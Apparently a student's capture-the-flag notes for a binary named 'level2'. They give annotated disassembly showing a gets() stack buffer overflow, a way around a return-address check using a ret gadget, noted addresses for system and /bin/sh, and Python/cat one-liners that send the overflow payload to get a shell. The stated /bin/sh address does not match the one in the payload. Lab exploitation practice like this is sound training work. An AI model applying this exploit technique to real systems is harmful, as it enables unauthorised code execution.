ebp main : 0xBFFFF748
adresse de retour au main : 0x0804854a

main:
	0x0804853f <+0>:	push   %ebp
	0x08048540 <+1>:	mov    %esp,%ebp
	0x08048542 <+3>:	and    $0xfffffff0,%esp

	0x08048545 <+6>:	call   0x80484d4 <p>
	@0x0804854a <+11>:	leave
	0x0804854a <+11>:	mov    %ebp,%esp
	0x0804854a <+11>:	pop    %ebp
	0x0804854b <+12>:	ret

ebp 
buffer : -0x4c -> ebp = 76

esp : -0x68

p:
	0x080484d4 <+0>:	push   %ebp
	0x080484d5 <+1>:	mov    %esp,%ebp

	0x080484d7 <+3>:	sub    $0x68,%esp ; 104

	0x080484da <+6>:	mov    0x8049860,%eax ; stdout
	0x080484df <+11>:	mov    %eax,(%esp)
	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt> ; fflush(stdout)

	0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax ; 76
	0x080484ea <+22>:	mov    %eax,(%esp)
	0x080484ed <+25>:	call   0x80483c0 <gets@plt>

	0x080484f2 <+30>:	mov    0x4(%ebp),%eax ; adresse de retour du main
	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp) ; 12
	0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
	0x080484fb <+39>:	and    $0xb0000000,%eax
	0x08048500 <+44>:	cmp    $0xb0000000,%eax
	0x08048505 <+49>:	jne    0x8048527 <p+83>

{
	0x08048507 <+51>:	mov    $0x8048620,%eax
	0x0804850c <+56>:	mov    -0xc(%ebp),%edx
	0x0804850f <+59>:	mov    %edx,0x4(%esp)
	0x08048513 <+63>:	mov    %eax,(%esp)
	0x08048516 <+66>:	call   0x80483a0 <printf@plt>

	0x0804851b <+71>:	movl   $0x1,(%esp)
	0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
}

	0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
	0x0804852a <+86>:	mov    %eax,(%esp)
	0x0804852d <+89>:	call   0x80483f0 <puts@plt>
	0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
	0x08048535 <+97>:	mov    %eax,(%esp)
	0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
	@0x0804853d <+105>:	leave
	0x0804853d <+105>:	mov    %ebp,%esp
	0x0804853d <+105>:	pop    %ebp
	0x0804853e <+106>:	ret

system address:  0xb7e6b060
/bin/sh : 0xbfffff27

gdb -ex "set args < <(python -c \"print 'a' * 80 +  '\x3e\x85\x04\x08' + '\x27\xfa\xff\xbf'\")"  ./level2

cat <(python -c "print 'a' * 80 +  '\x3e\x85\x04\x08' + '\x27\xfa\xff\xbf'") - | ./level2